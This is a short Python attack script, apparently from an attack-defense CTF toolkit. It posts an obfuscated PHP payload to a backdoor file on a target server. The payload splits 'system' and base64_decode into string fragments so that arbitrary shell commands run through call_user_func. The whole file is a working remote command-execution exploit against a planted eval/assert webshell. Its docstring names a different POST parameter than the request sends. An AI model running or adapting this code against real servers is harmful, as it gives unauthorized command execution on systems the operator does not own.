#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    eval($_POST[333]);
    assert($_POST[333]);
    '''
    
    try:           
        cmd = base64.b64encode(cmd)
        # This payload may not work under some php versions
        #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
        #print payload
        payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
        data = '2222=%s'% quote(payload) 
        res = http("post",target,target_port,"/files/01b32df0393023ea5361283085d3782c.php",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




